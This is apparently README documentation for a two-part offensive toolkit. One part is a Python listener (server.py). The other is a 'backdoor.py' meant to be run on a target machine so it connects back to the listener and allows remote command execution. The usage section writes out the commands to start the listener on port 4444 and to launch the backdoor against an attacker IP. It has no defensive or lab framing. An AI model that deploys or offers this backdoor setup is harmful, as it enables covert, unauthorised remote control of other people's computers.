

**server.py:**
- **Description:** This script sets up a server to listen for incoming connections on specified ports.
- **Usage:**
  - Execute `python server.py <port>` to start the server on a specific port.
  - Example: `python server.py 4444` to start the server on port 4444.
- **Features:**
  - Listens for incoming connections.
  - Handles multiple connections simultaneously.
  - Customizable port selection.
- **Requirements:**
  - Python 3.x
  - Sockets module (`import socket`)

**backdoor.py:**
- **Description:** This script establishes a connection from the target machine to the server for remote access.
- **Usage:**
  - Run `python backdoor.py <server_ip> <server_port>` on the target machine to connect to the server.
  - Example: `python backdoor.py 192.168.1.100 4444` to connect to the server at IP 192.168.1.100 on port 4444.
- **Features:**
  - Establishes a connection to the specified server and port.
  - Provides remote access to the target machine.
  - Allows for executing commands remotely.
- **Requirements:**
  - Python 3.x
  - Sockets module (`import socket`)
